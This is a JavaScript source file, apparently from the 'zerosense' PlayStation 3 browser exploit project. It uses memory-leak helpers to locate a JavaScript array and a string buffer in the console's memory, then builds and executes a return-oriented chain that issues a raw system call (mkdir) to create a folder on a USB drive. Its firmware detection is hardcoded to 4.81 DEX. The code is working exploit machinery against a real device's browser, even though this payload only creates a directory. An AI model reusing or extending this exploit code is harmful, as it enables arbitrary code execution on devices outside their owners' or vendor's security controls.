/*eslint-disable no-unused-vars, no-param-reassign*/

///////////////////////////////////////

var ArrayLeaker = require('zerosense/ArrayLeaker');
var ChainBuilder = require('zerosense/ChainBuilder');
var Logger = require('zerosense/Logger');
var MemoryReader = require('zerosense/MemoryReader');
var Searcher = require('zerosense/Searcher');
var Offsets = require('zerosense/Offsets');
var Util = require('zerosense/Util');

var logger = null;

var memoryReader = null;
var offsets = null;
var searcher = null;

(function() {
	try {
		var ua = navigator.userAgent;

		var environment = {};
		
		/*environment.ps3 = ua.indexOf("PLAYSTATION 3") !== -1;
		environment.firmware = environment.ps3 ? ua.substr(ua.indexOf("PLAYSTATION 3") + 14, 4)
				: "0.00";
		environment.dex = true;*/
		
		if (true) {
			environment.ps3 = true;
			environment.firmware = "4.81";
			environment.dex = true;
		}		

		var log = document.getElementById("log");
		if (log === null) {
			throw new Error("Log element not found.");
		}

		Logger.init(log);
		window.logger = logger = Logger.getLogger();
	} catch (e) {
		alert(e);
		console.error(e, e.name, e.stack);
		return;
	}

	try {
		logger.clear();

		if (environment.ps3) {
			logger.info(`Detected a PS3 on FW ${environment.firmware} ${environment.dex ? 'DEX' : 'CEX'}.`);
		} else {
			logger.info("No PS3 detected. May not work as expected.");
		}

		memoryReader = new MemoryReader();
		searcher = new Searcher(memoryReader);
		
		offsets = Offsets.get(environment);

		////////////////////
		
		var buttonCreateFolder = document.getElementById("buttonCreateFolder");
		buttonCreateFolder.addEventListener("click", () => createFolder());
		
		var buttonLogClear = document.getElementById("buttonLogClear");
		buttonLogClear.addEventListener("click", () => logger.clear());
	} catch (e) {
		if (environment.ps3) {
			alert(e);
		}
		console.error(e, e.name, e.stack);
	}
})();

///////////////////////////////////////

var arrayLeaker = null;
var buffer = null, addrBuffer = null;

function init() {
	if (arrayLeaker === null || !arrayLeaker.verify()) {
		logger.info("Initializing");
		
		arrayLeaker = new ArrayLeaker(memoryReader);
		arrayLeaker.createArray(20);
		
		var searchStart = 0x80190000;
		var searchEnd = 0x80600000;
		
		return searcher.startArray(searchStart, searchEnd - searchStart, arrayLeaker.getArray())
			.then((match) => {
				if (match === null) {
					throw new Error("Failed to init ArrayLeaker.");;
				}
				
				logger.info(`Found ArrayLeaker array at 0x${match.toString(16)}`);
				arrayLeaker.setAddress(match);
			})
			.then(() => {
				logger.info("Creating buffers...");
				
				var i = 0;
				buffer = Util.ascii("gtmp") + Util.pad(0x1000);
				arrayLeaker.setString(i, buffer);
				addrBuffer = arrayLeaker.getStringAddress(i);
				if (addrBuffer === null) {
					logger.error("Failed to get buffer address.");
					return;
				}
				addrBuffer += 4;
				logger.info(`Found buffer at 0x${addrBuffer.toString(16)}`);
				
				logger.info("Created buffers.");
			});
	}
	
	return Promise.resolve();
}

function createFolder() {
	logger.info("Creating folder...");
	
	Promise.resolve()
		.then(() => init())
		.then(() => {
			var path = Util.ascii("/dev_usb000/zerosense");
			var errno = mkdir(path);
			logger.info(`Errno: 0x${errno.toString(16)}`);
		})
		.then(() => logger.info("Created folder."))
		.catch((error) => logger.error(`Error while creating folder. ${error}`));
}

function mkdir(strpath) {
	var chain = new ChainBuilder(offsets, addrBuffer)
		.addData("path", strpath)
		.addDataInt32("errno")
		.syscall(0x32B, "path", 0o700, 0, 0, 0, 0, 0, 0)
		.storeR3("errno")
		.create();
	
	chain.prepare(arrayLeaker);
	chain.execute();
	
	var errno = Util.getint32(chain.getData().substr(chain.getDataOffset("errno") / 2, 0x4 / 2));
	return errno;
}

///////////////////////////////////////

